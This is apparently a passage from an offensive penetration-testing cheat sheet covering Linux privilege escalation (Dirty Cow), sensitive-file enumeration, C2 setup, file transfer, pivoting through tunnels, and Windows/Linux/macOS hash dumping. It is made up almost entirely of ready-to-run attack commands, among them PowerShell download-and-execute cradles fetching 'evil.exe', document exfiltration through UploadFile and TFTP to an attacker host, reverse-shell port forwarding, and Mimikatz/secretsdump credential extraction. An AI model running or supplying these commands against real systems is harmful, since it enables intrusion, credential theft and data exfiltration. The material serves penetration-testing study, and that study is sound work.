                <b>Compile</b>

                ```
                gcc 43418.c -o exploit
                ```

            </details>

            <details>
            <summary>Generic Kernel Exploit Methodology</summary>

            +
                <b>Basic Steps</b>

                <li>    1) Enumerate Kernel Version (uname -a)</li>
                <li>    2) Find Matching Exploits (Google, ExploitDB, GitHub)</li>
                <li>    3) Compile and Run</li>


            </details>

            <details>
            <summary>Dirty Cow</summary>

            +
                <br></br>    
                <b>Enumerate Kernel Version</b>

                ```
                uname -a 
                ```

                <br></br>    
                <b>Search for Vulnerability</b>

                ```
                searchsploit linux kernel 2.6.32 priv esc
                ```
                ```
                searchsploit linux kernel 2.6 priv esc debian
                ```
                ```
                ./linux-exploit-suggester-2.pl –k 2.6.32
                ```

                <br></br>

                <li>Linux-exploit-suggester should have shown Dirt Cow</li>
                <li>dirty_cow</li>
                <li>CVE-2016-5195</li>

                ```
                http://www.exploit-db.com/exploits/40616
                ```

                <br></br>
                <b>Transfer File to Target: Look at File Transfer for options</b>
                <br></br>
                <b>Compiling Code</b>   

                ```
                gcc -pthread c0w.c -o c0w
                ```

                <br></br>
                <b>Run exploit</b>

                ```
                ./c0w
                ```

                <br></br>
                <b>Get Shell</b>

                ```
                /usr/bin/passwd   
                ```

                <b>Restore original file</b>

                ```
                cp /tmp/bak /usr/bin/passwd
                ```

            </details>
        </details>
        <details>
        <summary>Service Exploits</summary>

        +
            <br></br>
            <b>Show all Processes running as root</b>

            ```
            ps aux | grep "^root"
            ```

            <br></br>
            <b>Show Program Version</b>

            ```
            <program> --version
            ```
            ```
            <program> -v
            ```
            ```
            dpkg -l | grep <program>
            ```
            ```
            rpm -qa | grep <program>
            ```

            <b>Use Linux Smart Enumeration</b>

            ```
            ./lse.sh -l 1 -i
            ```

        </details>

        <details>
        <summary>SUID/SGID Executables</summary>

        +
            <br></br>
            <b>Locate files with SUID or SGID bits set</b>

            ```
           find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null 
            ```

        </details>
    </details>
    
    <details>
    <summary>File Permissions</summary>
    
    +
        <b>Identify Files with insecure permissions: Directories Writable by current user</b>
    
        ```
        find / -writable -type d 2>/dev/null
        ```
        
        <br></br>
    </details>
    
    <details>
    <summary>Locating Sensitive Files</summary>

    + 
        <b>Basic</b>

        ```
        locate password | more
        ```
        ```
        cat /etc/profile
        ```
        ```                
        cat /etc/passwd
        ```
        ```            
        cat /etc/group
        ```
        ```  
        cat /etc/shadow
        ```
        ```  
        cat /etc/gshadow
        ```
        ```  
        cat /var/apache2/config.inc
        ```
        ```  
        cat /var/lib/mysql/mysql/user.MYD
        ```
        ```  
        cat /root/anaconda-ks.cfg
        ```
        ```  
        cat ~/.bash_history
        ```
        ```  
        cat ~/.bash_profile
        ```
        ```  
        cat ~/.bash_login
        ```
        ```  
        cat ~/.nano_history
        ```
        ```  
        cat ~/.atftp_history
        ```
        ```  
        cat ~/.mysql_history
        ```
        ```  
        cat ~/.php_history
        ```
        ```  
        ls -alh /var/mail/
        ```

        <br></br>
        <b>Sensitive Files for SSH</b>

        ```
        find / -name authorized_keys 2> /dev/null
        ```
        ```
        find / -name id_rsa 2> /dev/null
        ```

        <br></br>
        <b>Helpful Log Files</b>

        ```
        cat /etc/httpd/logs/access_log
        ```
        ```
        cat /etc/httpd/logs/access.log
        ```
        ```
        cat /etc/httpd/logs/error_log
        ```
        ```
        cat /etc/httpd/logs/error.log
        ```
        ```
        cat /var/log/apache2/access_log
        ```
        ```
        cat /var/log/apache2/access.log
        ```
        ```
        cat /var/log/apache2/error_log
        ```
        ```
        cat /var/log/apache2/error.log
        ```
        ```
        cat /var/log/apache/access_log
        ```
        ```
        cat /var/log/apache/access.log
        ```
        ```
        cat /var/log/auth.log
        ```
        ```
        cat /var/log/chttp.log
        ```
        ```
        cat /var/log/cups/error_log
        ```
        ```
        cat /var/log/dpkg.log
        ```
        ```
        cat /var/log/faillog
        ```
        ```
        cat /var/log/httpd/access_log
        ```
        ```
        cat /var/log/httpd/access.log
        ```
        ```
        cat /var/log/httpd/error_log
        ```
        ```
        cat /var/log/httpd/error.log
        ```
        ```
        cat /var/log/lastlog
        ```
        ```
        cat /var/log/lighttpd/access.log
        ```
        ```
        cat /var/log/lighttpd/error.log
        ```
        ```
        cat /var/log/lighttpd/lighttpd.access.log
        ```
        ```
        cat /var/log/lighttpd/lighttpd.error.log
        ```
        ```
        cat /var/log/messages
        ```
        ```
        cat /var/log/secure
        ```
        ```
        cat /var/log/syslog
        ```
        ```
        cat /var/log/wtmp
        ```
        ```
        cat /var/log/xferlog
        ```
        ```
        cat /var/log/yum.log
        ```
        ```
        cat /var/run/utmp
        ```
        ```
        cat /var/webmin/miniserv.log
        ```
        ```
        cat /var/www/logs/access_log
        ```
        ```
        cat /var/www/logs/access.log
        ```
        ```
        ls -alh /var/lib/dhcp3/
        ```
        ```
        ls -alh /var/log/postgresql/
        ```
        ```
        ls -alh /var/log/proftpd/
        ```
        ```
        ls -alh /var/log/samba/
        ```
        ```                
        Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
        ```

        <br></br>
    </details>
    
    <details>
    <summary>Installed Application</summary>

    + 
        <b>Debian</b>

        ```
        ls -alh /usr/bin/
        ```
        ```
        ls -alh /sbin/
        ```
        ```
        dpkg -l
        ```
        ```
        ls -alh /var/cache/apt/archivesO
        ```
        ```
        ls /usr/share/applications | awk -F '.desktop' ' { print $1}' -
        ```

        <br></br>
        <b>RedHat</b>

        ```
        rpm -qa
        ```
        ```
        ls -alh /var/cache/yum/
        ```

        <br></br>
        <b>BSD</b>

        ```
        pkg_info
        ```

        <br></br>
        <b>Gentoo</b>

        ```
        equery list
        eix -I
        ```

        <br></br>
        <b>Arch Linux</b>

        ```
        pacman -Q
        ```

        <br></br>
        <b>Bash Script</b>

        ```
        #!/bin/bash
        IFS=: read -ra dirs_in_path <<< "$PATH"

        for dir in "${dirs_in_path[@]}"; do
            for file in "$dir"/*; do
                [[ -x $file && -f $file ]] && printf '%s\n' "${file##*/}"
            done
        done
        ```

        <br></br>
    </details>
    
    <details>
    <summary>Network</summary>

    + 
        <b>What does the targets network look like</b>

        ```
        /sbin/ifconfig -a
        ```
        ```
        /sbin/ip addr
        ```
        ```
        cat /etc/network/interfaces
        ```
        ```
        cat /etc/sysconfig/network
        ```
        ```
        ip addr show
        ```

        <br></br>
        <b>Network configuration Settings</b>

        ```
        cat /etc/resolv.conf
        ```
        ```
        cat /etc/sysconfig/network
        ```
        ```
        cat /etc/networks
        ```
        ```
        iptables -L
        ```
        ```
        hostname
        ```
        ```
        dnsdomainname
        ```

        <br></br>
        <b>List all current connections</b>

        ```
        lsof -i
        ```
        ```
        lsof -i :80
        ```
        ```
        grep 80 /etc/services
        ```
        ```
        netstat -antup
        ```
        ```
        netstat -antpx
        ```
        ```
        netstat -tulpn
        ```
        ```
        chkconfig --list
        ```
        ```
        chkconfig --list | grep 3:on
        ```

        <br></br>
        <b>Check the routes</b>

        ```
        arp -e
        ```
        ```
        route
        ```
        ```
        route -n
        ```
        ```
        /sbin/route -nee
        ```
        ```
        ip route list
        ```

        <br></br>
    </details>

    <details>
    <summary>Running Processes</summary>

    + 
        <br></br>
        <b>Linux Commands to Run</b>

        ```
        top
        ```
        ```
        htop
        ```
        ```
        ps -e
        ```
        ps -ef
        ```
        ps aux
        ```
        ```
        ps aux | more
        ```
        ```
        ps aux | less
        ```
        ```
        ps -fc leafpad
        ```

        <br></br>
        <b>Jobs: List Jobs</b>

        ```
        jobs
        ```

        <b>Jobs: Send to Foreground</b>

        ```
        fg
        ```

        <b>Jobs: Send Job id 3 to Foreground</b>

        ```
        fg %3
        ```

        <b>Jobs: Send Current Job to Foreground</b>

        ```
        fg %+
        ```

        <b>Jobs: Send Previous Job to Foreground</b>

        ```
        fg %-
        ```

        <b>Jobs: Send Ping Job to Foreground</b>

        ```
        fg %ping
        ```

        <b>Jobs: Resume in Background</b>

        ```
        bg
        ```

        <br></br>
        <b>Finding Processes</b>

        ```
        pgrep
        ```

        <br></br>
        <b>Terminating a Process</b>

        ```
        kill
        ```
        ```
        kill -9 PID
        ```
        ```
        pkill processName
        ```
        ```
        killall
        ```

        <br></br>
    </details>
    
    <details>
    <summary>Scheduled Jobs/Tasks</summary>

    + 
        <b>View Scheduled Jobs</b>

        ```
        ls -lah /etc/cron*
        ```
        ```
        cat /etc/crontab
        ```
        ```
        cat /etc/anacrontab
        ```
        ```
        cat /etc/frontal
        ```
        ```
        cat /etc/anacron
        ```
        ```
        systemctl list-timers --all
        ```

        <br></br>
    </details>
    
    <details>
    <summary>System Information</summary>

    + 
        <b>Common Commands</b>

        ```
        uname -a
        ```
        ```
        cat /etc/issue
        ```
        ```
        cat /etc/*-release
        ```
        ```
        cat /proc/version
        ```
    
        <b>Architecture</b>
        
        ```
        uname -m
        ```

        <b>Debian</b>

        ```
        dmesg | grep Linux
        ```

        <b>RedHat</b>

        ```
        rpm -q kernel
        ```

        <br></br>
    </details>
    
    <details>
    <summary>Enumerating Other</summary>
    
    +
        <b>Unmounted Disks</b>
    
        ```
        mount
        ```
        
        <b>Drives Mounted at Boot</b>
    
        ```
        cat /etc/fstab
        ```
    
        <b>All Available Disks</b>
       
        ```
        lsblk
        ```
    
        <b>Loaded Kernel Modules</b>
        
        ```
        lsmod
        ```
        
        <b>Info about certain Kernal Module</b>
        
        ```
        modinfo <ModuleName>
        ```
        ```
        /sbin/modinfo <ModuleName>
        ```
    
        <b>Binaries that AutoElevate</b>
        
        ```
        find / -perm -u=s -type f 2>/dev/null
        ```
  
    </details>
    
    <details>
    <summary>Users and Groups</summary>

    + 
        <b>Enumerating Linux Users</b>

        ```
        cat /etc/passwd
        ```
        less etc/passwd
        ```
        getent passwd | awk -F: '{ print $1}'
        ```
        ```
        cut -d: -f1 /etc/passwd
        ```
        ```
        awk –F: ‘{ print $1}’ /etc/passwd
        ```
        ```
        getent passwd {1000..6000}
        ```

        <br></br>
        <b>Enumerating User Permissions</b>

        ```
        id
        ```
        ```
        id -nG
        ```
        ```
        getent group
        ```

        <br></br>
        <b>Enumerating Linux Groups</b>

        ```
        groups
        ```
        ```
        less /etc/group
        ```
        ```
        getent groups
        ```
        ```
        getent group | awk -F: '{ print $1}'
        ```    

        <br></br>
    </details>
</details>

<details>
<summary>C2 Frameworks</summary>

+ <details>
    <summary>Empire C2</summary>

    + 
        <br></br>
        <b>Github</b>

        ```
        https://github.com/BC-SECURITY/Empire
        ```

        <b>Kali Install</b>

        ```
        apt install powershell-empire
        ```

        <b>Manual Install</b>

        ```
        cd /Empire/setup
        ```
        ```
        ./install.sh
        ```

        <b>Setup Listeners from Empire</b>

        ```
        listeners
        ```
        ```
        uselistener
        ```

        <b>Listener Options</b>

        ```
        dbx http http_com http_foreign http_hop http_mapi meterpreter onedrive redirector
        ```

        <br></br>
    </details>

    <details>
    <summary>Covenant</summary>

    + 
        <br></br>
        <b>Source</b>

        ```
        https://github.com/cobbr/Covenant
        ```
        <br></br>
        <b>Install with APT</b>

        ```
        sudo apt install covenant-kbx
        ```

        <b>Install Manually</b>

        ```
        apt install dotnet-sdk-2.2
        ```
        ```
        git clone --recurse-submodules https://github.com/cobbr/Covenant
        ```
        ```
        cd Covenant/Covenant
        ```
        ```
        dotnet build
        ```
        ```
        dotnet run
        ```

        <br></br>
    <details>
</details>


<details>
<summary>Transfering Files</summary>

+ 
    <br></br>
    <b>FTP: Install pyftpdlib & pure-ftpd</b>

    ```
    pip3 install pyftpdlib
    ```
    ```
    sudo apt update && sudo apt install pure-ftpd
    ```
    
    <b>Creating New user</b>
    ```
    #!/bin/bash

    groupadd ftpgroup
    useradd -g ftpgroup -d /dev/null -s /etc ftpuser
    pure-pw useradd offsec -u ftpuser -d /ftphome
    pure-pw mkdb
    cd /etc/pure-ftpd/auth/
    ln -s ../conf/PureDB 60pdb
    mkdir -p /ftphome
    chown -R ftpuser:ftpgroup /ftphome/
    systemctl restart pure-ftpd
    ```
    
    ```
    sudo ./setup-ftp.sh
    ```
    
    ```
    service pure-ftpd start
    ```

    <b>FTP: Run</b>

    ```
    python3 -m pyftpdlib -p 21 -w
    ```

    <li><b>(-m)</b></li>
    <li><b>(-w)</b> Allow Annonymous Write Access</li>

    <br></br>
    <b>Web</b>

    ```
    python3 -m http.server 443
    ```
    ```
    service apache2 start
    ```

    <br></br>
    <b>Powershell: Raw (Will get Flagged by AV/AMSI)</b>

    ```
    powershell -c (New-Object Net.WebClient).DownloadFile('http://x.x.x.x:port/file', 'output-file'
    ```
    ```
    powershell -c Invoke-WebRequest -Uri "http://x.x.x.x" -OutFile "C:\path\file"
    ```

    <br></br>
    <b>Powercat: Send Files</b>

    ```
    powercat -c x.x.x.x -p 4444 -i C:\inputfile
    ```

    <b>Powercat: Recieve Files</b>

    ```
    powercat -l -p 4444 -of C:\inputfile
    ```

    <br></br>
    <b>Linux: scp</b>

    ```
    scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2
    ```

    <b>Linux: scp through ssh</b>

    ```
    scp -P 2322 passwords.txt remote_username@x.x.x.x:/remote/directory
    ```

    <b>Linux: scp remote file to local system</b>

    ```
    scp remote_username@x.x.x.x:/remote/file.txt /local/directory
    ```

    <br></br>
    <b>SimpleHTTPServer Upload: Services To Upload from System to Target</b>

    ```
    https://gist.github.com/touilleMan/eb02ea40b93e52604938
    ```
    
    <br></br>
    
    <b>Windows Host via bindshell</b>
    <li>attack machine</li>
    
    ```
    sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
    ```
    ```
    sudo systemctl restart pure-ftpd
    ```
    
    <li>Windows Machine</li>
    <li>ftp.txt</li>
    
    ```
    type ftp.txt
    open x.x.x.x 21
    USER <USERNAME>
    <PASSWORD>
    bin
    GET nc.exe
    bye
    ```
    
    ```
    ftp -v -n -s:ftp.txt
    ```

    <br></br>
    
    <b>vbscript: Windows XP, 2003 HTTP Downloader</b>
    <b>Paste in windows bindshell</b>
    
    ```
    echo strUrl = WScript.Arguments.Item(0) > wget.vbs
    echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
    echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
    echo  Err.Clear >> wget.vbs
    echo  Set http = Nothing >> wget.vbs
    echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
    echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
    echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
    echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
    echo  http.Open "GET", strURL, False >> wget.vbs
    echo  http.Send >> wget.vbs
    echo  varByteArray = http.ResponseBody >> wget.vbs
    echo  Set http = Nothing >> wget.vbs
    echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
    echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
    echo  strData = "" >> wget.vbs
    echo  strBuffer = "" >> wget.vbs
    echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
    echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
    echo  Next >> wget.vbs
    echo  ts.Close >> wget.vbs
    ```
    
    ```
    cscript wget.vbs https://x.x.x.x/wget.exe wget.exe
    ```
    
    <b>vbscript: Windows 7, 2008, and above HTTP Downloader</b>
    <b>Paste in windows bindshell</b>
    
    ```
    echo $webclient = New-Object System.Net.WebClient >>wget.ps1
    echo $url = "http://x.x.x.x/evil.exe" >>wget.ps1
    echo $file = "new-exploit.exe" >>wget.ps1
    echo $webclient.DownloadFile($url,$file) >>wget.ps1
    ```
    
    ```
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
    ```
    
    <b>OR use a 1 liner</b>
    
    ```
    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://x.x.x.x/evil.exe', 'new-exploit.exe')
    ```
    
    <b>Download & Execute Script without saving to Disk</b>
    <b>Linux Attack Box</b>
    
    ```
    echo "Write-Output 'Hello World'" > helloworld.ps1
    ```
    
    <b>Windows Target Bind Shell</b>
    
    ```
    powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/helloworld.ps1')
    ```
    
    <br></br>
    <b>Windows Downloads: exe2hex & Powershell</b>
    
    ```
    locate nc.exe | grep binaries
    ```
    ```
    cp /usr/share/windows-resources/binaries/nc.exe .
    ```
    
    <b>Reduce File Size</b>
    
    ```
    upx -9 nc.exe
    ```
    
    <b>Convert to Windows Script</b>
    
    ```
    exe2hex -x nc.exe -p nc.cmd
    ```
    ```
    cat nc.cmd | xclip -selection clipboard
    ```
    
    <b>Paste into Windows Bind Shell</b>
    
    <br></br>
    <b>Windows 7,2008 R2 And Above  Uploads: Windows Scripting Languages</b>
    
    <b>Linux Attack Machine</b>
    
    
    ```
    sudo vim /var/www/html/upload.php
    ```
    ```
    <?php
    $uploaddir = '/var/www/uploads/';
    
    $uploadfile = $uploaddir . $_FILES['file']['name'];
    
    move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
    ?>
    ```
    ```
    sudo mkdir /var/www/uploads
    ```
    ```
    sudo chown www-data: /var/www/uploads
    ```
    
    <b>Windows Target Machine Exfiltrating Interesting Documents</b>
    
    ```
    powershell (New-Object System.Net.WebClient).UploadFile('http://x.x.x.x/upload.php', '/path/to/important.docx')
    ```
    
    <br></br>
    <b>Windows xp, 2003: Uploading Files TFTP</b>
    <b>Linux Attack Machine</b>
    
    ```
    sudo apt update && sudo apt install atftp
    ```
    ```
    sudo mkdir /tftp
    ```
    ```
    sudo chown nobody: /tftp
    ```
    ```
    sudo atftpd --daemon --port 69 /tftp
    ```
    
    <b>Windows BindShell</b>
    
    ```
    tftp -i x.x.x.x put important.docx
    ```
    
     
</details>
        
<details>
<summary>Port Redirection and Tunneling</summary>

+ <details>
    <summary>Port Forwarding: Allow Client to access Internet through Kali machine</summary>

    + 
        <b>Test for Internet Connectivity</b>
        
        ```
        ping -c 4 www.google.com
        ```
    
        <b>Netcat to IP shown in ping for www.google.com on both kali and then on Victim machine</b>
    
        ```
        nc -nvv x.x.x.x 80
        ```
        ```
        GET / HTTP/1.0
    
    
        ```

        <br></br>
        <b>RINETD: Install on Kali Machine</b>

        ```
        sudo apt update && sudo apt install rinetd
        ```
    
        <br></br>
        <b>Add Forwarding Rule: Line 21: Redirect any traffic to Kali webserver on port 80 to google IP address: x.x.x.x = www.google.com IP address in this case</b>
        
        ```
        vim /etc/rinetd.conf
        ```
        ```
        0.0.0.0 80 x.x.x.x 80
        ```
        
        <br></br>
        <b>Restart Service</b>
    
        ```
        sudo service rinetd restart
        ```
        
        <br></br>
        <b>Check if Service is Listening on port 80</b>
    
        ```
        ss -antp | grep "80"
        ```
        
        <br></br>
        <b>Test Connection again from Victim machine but this time x.x.x.x = Kali IP</b>
        
        ```
        nc -nvv x.x.x.x 80
        ```
        ```
        GET / HTTP/1.0
    
    
        ```
        
        <br></br>
    
    </details>
    
    <details>
    <summary>SSH Tunneling</summary>
    
    + <details>
        <summary>SSH Local Port Forwarding: SMB Example</summary>
        
        +
            <b>On Fully compromized machine: Look to see if it has second interface connected to internal network</b>
            
            ```
            ip a
            ```
            
            <br></br>
            <b>Pivot from compromized client to windows machine</b>
            
            ```
            sudo ssh -N -L 0.0.0.0:445:[Windows_IP]:445 [USER@Compromized_HOST_IP]
            ```
            
            <br></br>
            <b>add line to smb.comf</b>
            
            ```
            sudo echo "min protocol = SMB2" >> /etc/samba/smb.conf
            ```
            
            <b>Restart Smaba</b>
            
            ```
            sudo /etc/init.d/smbd restart
            ```

            <br></br>
            <b>Connect to Remote Shares</b>
            
            ```
            smbclient -L 127.0.0.1 -U Administrator
            ```
    
        </details>
        
        <details>
        <summary>SSH Local Port Forwarding: Webserver Example</summary>
        
        +
            <b>On Fully compromized machine: Look to see if it has second interface connected to internal network</b>
            
            ```
            ip a
            ```
            
            <br></br>
            <b>Pivot from compromized client to webserver client on 127.0.0.1</b>
          
            ```
            sudo ssh -p 2222 -N -L :80:127.0.0.1:80 [USER@Compromized_HOST_IP]
            ```
            
            <br></br>
            <b>Test Connection & Vist website</b>
            
            ```
            sudo nc -nvv 127.0.0.1 80
            ```
            ```
            GET / HTTP/1.0
    
    
            ```
            ```
            firefox 127.0.0.1
            ```
            
            <br></br>
        
        </details>
        
        <details>
        <summary>SSH Remote Port Forwarding: MySQL Example</summary>
        
        +
            <b>From Victim machine: Open Listener on Kali machine and Forward to Internal Target IP and Port</b>
            
            ```
            ssh -N -R [Kali_IP]:2221:[RHOST]:[RPORT] [username]@[kali_IP]
            ```
            
            <br></br>
            <b>From Kali: Confirm Port is listening</b>
            
            ```
            ss -antp | grep "2221"
            ```
            
            <br></br>
            <b>Scan with nmap</b>
            
            ```
            sudo nmap -sS -sV 127.0.0.1 -p 2221
            ```
            
            <br></br>
        </details>
        
        <details>
        <summary>SSH Remote Port Forwarding: Reverse Shell Example</summary>
        
        +
            <b>From Kali machine: Connect to Target machine and Forward traffic from Target IP/Port to Kali IP/Port</b>
            
            ```
            ssh -N -R [RHOST]:[RPORT]:[LHOST]:[LPORT] [username]@[target_IP]
            ```
            ```
            nc -nlvp [LPORT]
            ```
        
        </details>   
        
        <details>
        <summary>SSH Dynamic Port Forwarding</summary>
        
        +   
            <b>Set a local listening port and have it tunnel incoming traffic to any remote destination through the use of a proxy</b>
            <br></br>
            <li>From Target Machine: Check connections</li>
            
            ```
            ip a
            ```
            
            <br></br>
            <b>From Kali Machine : Set up Tunnel</b>
            
            ```
            sudo ssh -N -D 127.0.0.1:8080 [username]@[RHOST]
            ```
            
            <br></br>
            <b>Add socks4 proxy to proxychains.conf</b>
            
            ```
            sudo vim /etc/proxychains4.conf
            ```
            ```
            socks4 127.0.0.1 8080
            ```
            
            <br></br>
            <b>Run Tools trough proxy by adding proxychains to front of command: Nmap example</b>
            
            ```
            proxychains nmap -sT -Pn x.x.x.x
            ```
            ```
            proxychains nc -zv localhost [IP-Range]
            ```
            
            <br></br> 
        </details>
        
        <details>
        <summary>PLINK.exe | Pivotion through Windows OS</summary>
        
        +   
            <b>From Windows Machine: Starting with system level access. Discover services running</b>
            
            ```
            netstat -anpb TCP
            ```
            
            <b>From Windows Machine: Service Blocking internal connections to service. Transfer PLINK.exe with noninteractive transfer method</b>
            
            ```
            echo open [Kali_IP] 21 > ftp.txt
            ```
            ```
            echo USER [Kali_FTP_username] >> ftp.txt
            ```
            ```
            echo [Kali_FTP_password] >> ftp.txt
            ```
            ```
            echo bin >> ftp.txt
            ```
            ```
            echo GET plink.exe >> ftp.txt
            ```
            ```
            echo bye >> ftp.txt
            ```
            ```
            ftp -v -n -s:ftp.txt
            ```
            
            <br></br>
            <b>From Windows: Setup Tunnel and pipe answer to interactive prompt</b>
            
            ```
            cmd.exe /c echo y | plink.exe -ssh -l [Kali_USERNAME] -pw [Kali_Password] -R [Kali_IP]:1234:127.0.0.1:[ServicePort] [Kali_IP]
            ```
            
            <br></br>
            <b>From Kali: Nmap  the service on windows machine via tunnel</b>
            
            ```
            sudo nmap -sS -sV 127.0.0.1 -p 1234
            ```
            
            <br></br>

        </details>
        
        <details>
        <summary>Netsh | Pivotion through Windows OS From fully compromised machine</summary>
        
        +  
            <br></br>
            <b>From Compromised Windows Target: Check if Windows machine is connected to another Network Interface</b>
            
            ```
            ipconfig
            ```
            
            <br></br>
            <b>From Compromised Windows Target: Forward Traffic from windows machine to machine connected to other Network Interface</b>
            
            ```
            netsh interface portproxy add v4tov4 listenport=4455 listenaddress=[Windows_IP] connectport=445 connectaddress=[IP_of_Machine_on_other_Interface]
            ```
            
            <br></br>
            <b>From Compromised Windows Target: Check if machine is listening on port 4455</b>
            
            ```
            netstat -anp TCP | find "4455"
            ```
            
            <br></br>
            <b>From Compromised Windows Target: Add Firewall rule to allow inbound connections on port 4455</b>
            
            ```
            netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=[Windows_IP] localport=4455 action=allow
            ```
            
            <br></br>
            <b>From Kali: Edit samba.conf | Add line to end of file</b>
            
            ```
            vim /etc/samba/smb.conf
            ```
            ```
            min protocol = SMB2
            ```
            
            <br></br>
            <b>From Kali: Restart Samba</b>
            
            ```
            sudo /etc/init.d/smbd restart
            ```
            
            <br></br>
            <b>From Kali: View Shares of Tunneled Machine</b>
            
            ```
            smbclient -L [Windows_IP] --port=4455 --user=Administrator
            ```
            
            <br></br>
            <b>From Kali: Interact with Shares of Tunneled Machine</b>
            
            ```
            sudo mkdir /mnt/win10_share
            ```
            ```
            sudo mount -t cifs -o port=4455 //[Windows_IP]/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share
            ```
            ```
            ls -l /mnt/win10_share/
            ```
            ```
            cat /mnt/win10_share/data.txt
            ```
            
            <br></br>
            
        
        </details>
        
        <details>
        <summary>HTTP Tunneling Through Deep Packet Inspection: Used if SSH is blocked</summary>
        
        +  
            <br></br>
            <b>Kali: Install httptunnel</b>
            
            ```
            sudo apt install httptunnel
            ```
            
            <br></br>
            <b>From Compromised target: Upgrade shell</b>
            
            ```
            python -c 'import pty; pty.spawn("/bin/bash")'
            ```
            
            <br></br>
            <b>From Compromised target: Create Local Port Forward between this machine and target</b>
            
            ```
            ssh -L 0.0.0.0:8888:[Target_Machine_IP]:3389 [Compromised_Machine_Username]@127.0.0.1
            ```
            
            <b>From Compromised target: Check if port is listening</b>
            
            ```
            ss -antp | grep "8888"
            ```
            
            <br></br>
            <b>From Compromised target: Create HTTP Tunnel Server</b>
            
            ```
            hts --forward-port localhost:8888 1234
            ```
            
            <b>From Compromised target: Check if Server is running</b>
            
            ```
            ps aux | grep hts
            ```
            ```
            ss -antp | grep "1234"
            ```
            
            <br></br>
            <b>From Kali: Create HTTP Tunnel Client</b>
            
            ```
            htc --forward-port 8080 [Compromised_Target_IP]:1234
            ```
            
            <b>From Kali: Check if Client is running</b>
            
            ```
            ps aux | grep hts
            ```
            ```
            ss -antp | grep "8080"
            ```
            
            <br></br>
            <b>From Kali: RDP over Tunnel</b>
            
            ```
            rdesktop 127.0.0.1:8080
            ```
            
            <br></br>
            
        </details>
    </details>
</details>

<br></br>
<H1>What to do with Hashes?</H1>

<details>
<summary>Dumping Hashes</summary>

+ <details>
    <summary>Windows</summary>

    + 
        <br></br>
        <b>Meterpreter HashDump</b>

        ```
        run post/windows/gather/hashdump
        ```

        <br></br>
        <b>Meterpreter Mimikatz (Post Exploitation must be executed from SYSTEM privileges)</b>

        ```
        load mimikatz
        ```
        ```
        creds_all
        ```

        <b>Meterpreter Mimikatz: Dump LSA Secrets</b>

        ```
        lsadump.py sys_backup.hiv sec_backup.hiv
        ```

        <b>Meterpreter Mimikatz: Dump Local Password Hashes</b>

        ```
        pwdump.py sys_backup.hiv sec_backup.hiv
        ```

        <br></br>
        <b>reg.exe</b>

        ```
        reg save HKLM\sam sam
        ```
        ```
        reg save HKLM\system system
        ```

        <br></br>
        <b>samdump2</b>

        ```
        samdump2 SYSTEM SAM > hashes.db
        ```

        <br></br>
        <b>Impacket Tools</b>

        ```
        secretsdump.py -ntds ~/Extract/ntds.dit -system ~/Extract/SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-hashes
        ```

        <b>Impacket Tools: Have the NTDS.dit file And SYSTEM Hive</b>

        ```
        secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL
        ```

        <br></br>
    </details>

    <details>
    <summary>Linux</summary>

    + 
        <br></br>
        <b>Requires Root Priv</b>

        ```
        cat /etc/shadow
        ```
        ```
        grep [USER] /etc/passwd > passwd
        ```
        ```
        sudo grep [USER] /etc/shadow > shadow
        ```
        ```    
        unshadow passwd shadow > unshadowed.txt
        ```

        <br></br>
    </details>

    <details>
    <summary>OSX</summary>

    + 
        <br></br>
        <b>10.5-10.7</b>

        ```
        dscl localhost -read /Search/Users/<username>|grep GeneratedUID|cut -c15-cat /var/db/shadow/hash/ <guid>| cut -c169-216 > osx_hash.txt</guid></username>
        ```

        <b>10.8-10.12</b>

        ```
        sudo defaults read /var/db/dslocal/nodes/Default/users/<username>.plist ShadowHashData|tr -dc ‘0-9a-f’|xxd -p -r|plutil -convert xml1 - -o -</username>
        ```

        <br></br>
        <li><b></b></li>
        <br></br>
    </details>

    <details>
    <summary>Other Resources</summary>

    + 
        <br></br>
        <b>Lsassy</b>

        ```
        https://github.com/Hackndo/lsassy
        ```

        <br></br>
    </details>
</details>
</details>

<details>
<summary>Identifying Hash Types</summary>

+ 
    <br></br>
    <b>Kali</b>

    ```
    Hash-identifier
    ```
    ```
    hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
    ```

    <b>Online</b>
    ```
    https://www.tunnelsup.com/hash-analyzer/
    ```

    <br></br>
    
    <b>Disecting a Hash</b>
    
    ```
    $6$Rw99zZ2B$AZwfboPWM6z2tiBeK.EL74sivucCa8YhCrXGCBoVdeYUGsf8iwNxJkr.wTLDjI5poygaUcLaWtP/gewQkO7jT/
    ```
    
    <li><b>$6$</b>SHA-512 Algorithm</li>
    <li><b>Rw99zZ2B</b>SALT - Random Value used along with Clear Text Password to calculate pass hash</li>
    
    
</details>
</details>

<details>
